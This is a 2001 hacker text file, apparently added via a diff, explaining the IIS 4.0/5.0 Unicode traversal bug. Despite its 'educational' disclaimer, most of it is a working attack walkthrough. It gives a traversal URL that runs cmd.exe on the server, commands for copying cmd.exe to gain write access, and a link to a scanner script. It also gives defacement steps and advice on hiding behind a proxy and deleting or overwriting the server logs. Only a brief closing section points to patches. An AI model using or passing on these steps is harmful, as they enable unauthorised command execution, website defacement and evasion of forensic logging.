@@ -1,0 +1,164 @@
+ ------------------------------------------------------------------------
+|	The UNICODE bug explained, by ReDeeMeR.				|
+|	www.g0tr00t.net		June 2001				|
+|									|
+|	redeemer@g0tr00t.net						|
+|									|
+|	See also, http://www.wiretrip.net/rfp/p/doc.asp?id=57&iface=3	|
+|									|
+|	This document is ©ReDeeMeR and NO PARTS MAY BE TAKEN OR 	|
+|	MODIFIED without the authors permission.			|
+|									|
+ ------------------------------------------------------------------------
+
+-=[ Disclaimer ]=-
+							
+I have never used these *illegal* methods of hacking, and this document		
+is simply for educational purposes ONLY, the aim being so that admins	
+can realise how easily they can be hacked, and I hope that they will go
+on to secure their machines. This document was compiled with my general	
+knowledge of Operating Systems, and how they work. If you are reading this
+and intend to go on to USE the methods described, then stop reading now.
+Security is an illusion.	
+
+-=[ Short Explanation ]=-
+
+The unicode bug is a bug in the UNICODE character set which is installed with
+IIS4.0/5.0 which usually runs on NT4/Win2k respectively. As rfp put in his
+wiretrip.net post, "IIS seems to decode UNICODE at the wrong instance 
+(after path checking, rather than before)." And so it is exploitable.
+
+-=[ History ]=-
+
+The first occurance of the unicode bug was when someone (anonymous person)
+said they could execute commands on an IIS5.0 webserver with the following URL:
+
+	http://address.of.iis5.system/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\ 
+
+And they gave a "live" example to prove their find. This lead to many security 
+analysts researching into this "bug" some more to see if it was not just only
+a server specific hole, and was in fact a hole in _all_ IIS4.0/5.0 systems.
+
+The research was successful, and it was concluded that the UNICODE bug was a
+security hole in _all_ IIS webservers that lead to remote users being able to
+execute commands on the vulnerable machine.
+
+The funny thing with unicode, is that the exploit differs for each UNICODE character
+set. For instance, if you are using an IIS server which is in Chinese (.cn), then 
+it is using a different UNICODE character set to English (.uk) systems. And so the exploit
+is different depending on the UNICODE character set in use.
+
+-=[ Usage ]=-
+
+Well, there are *many* Unicode exploit strings that are "successful" so I am not going
+to list them here. You can find them on bugtraq, packetstorm etc.
+
+Firstly, it doesn't matter what OS the machine you are attacking is using. It is a web
+server specific hole that we are exploiting, and so as long as the server is IIS 4.0 
+or 5.0, the OS doesn't matter. So *if* (you won't, trust me) you find a OpenBSD system
+running an "out-of-the-box" install of IIS4.0, this is your lucky day. I have only ever
+attacked WindowsNT/2k with the unicode bug, so I am not quite sure how it would work on
+a *nix system, how the fuck would you get c:\winnt on a *nix system? heh..
+
+Firstly, get the Perl script from the Scripts section of g0tr00t.net,
+
+	http://195.13.75.249/shell.pl
+
+This is a Perl script that will scan the host you give it for the unicode bug. If it finds
+it is exploitable, it will let you know ;)
+
+Okay, so now use this perl script and enter the host you want to scan (it *must* be on 
+IIS4.0/5.0 remember) and let the script do it's stuff.
+
+If it tells you it is vulnerable (you will know if it is) then take the complete URL it gives
+you, and paste it into your browser. Using the .pl script to actually execute commands on
+the system is stupid, it doesn't work very well, your browser is the best tool for this :)
+
+So your URL is something like this:
+
+	http://address.of.iis5.system/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\ 
+
+Okay, so first we need "write access" to the drives on the machine. Execute this command:
+
+	cmd.exe?/c+copy+c:\winnt\system32\cmd.exe+c:\winnt\system32\cmd1.exe
+
+Now change the URL you are using to this:
+
+	/winnt/system32/cmd1.exe?/c+dir+c:\
+
+You now have write access, test it by doing:
+
+	cmd1.exe?/c+echo+hello!+>+c:\test.txt
+	cmd1.exe?/c+echo+hello!+>+d:\test.txt
+
+If you get an access denied error, then you _can't_ get write access, so fuck it, find another
+server.
+
+-= Defacing =-
+
+Well, this tutorial is not for defacing, but I can tell you that the *default* webserver directory
+is in:
+	
+	c:\InetPub\WWWRoot
+
+But you can find any HTML files by doing:
+
+	cmd1.exe?/c+dir+/S+c:\*.html
+
+So you can find the HTML easily then :)
+
+To deface it, just echo your message to a file, then "copy index.html backup.html", 
+then "copy your-file index.html"
+
+-= Cleaning Up =-
+
+Well, it is important to know that ALL IIS SERVERS WILL LOG YOUR ACTIONS. They will have a basic
+HTTPd log with the stuff you have been doing, so uhm I suggest you use a proxy server before
+exploring any systems.
+
+The logs, by default are in C:\WINNT\SYSTEM32\LOGFILES\W3SVC32 but almost definately will not be
+there, so execute this command:
+
+	cmd1.exe?/c+dir+/S+c:\*W3SVC32
+
+And you _should_ find them. It is best to remove them too btw :)
+
+You might not be able to remove the log file in use (as it is in use). Try and echo over it or something
+so that it is clearned.
+
+-=[ Patching UNICODE ]=-
+
+Okay, if you're an admin of a system that runs IIS, you most probably want to patch your system(s) ;)
+
+So, for IIS4.0 goto:
+
+	http://www.microsoft.com/ntserver/nts/downloads/critical/q269862/
+
+For IIS5.0 goto:
+
+	http://www.microsoft.com/windows2000/downloads/critical/q269862/
+
+And for other Windows updates (patch up guys!), goto:
+
+	http://security.alldas.de/patches/?op=detail&distribution=Windows
+
+I suggest you signup to the Windows security mailing lists too, so go to:
+
+	http://www.microsoft.com/technet/security/notify.asp
+
+-=[ Conclusion ]=-
+
+Well this ends my UNICODE vulnerability explanation. I in no way discovered this hole, I am just a lam0r
+who used to "hack" (no, it is not hacking) IIS and decided to write this up to inform people of the
+vulnerabilities involved. If you plan on defacing Windows, prepare to be flamed by a few people too.
+Unless of course, www.microsoft.com is invloved.......
+
+Windows sucks, "hacking" it is easy. Too easy. Get *nix people.
+
+Thanks,
+-ReDeeMeR-
+
+www.g0tr00t.net
+redeemer@g0tr00t.net
+
+
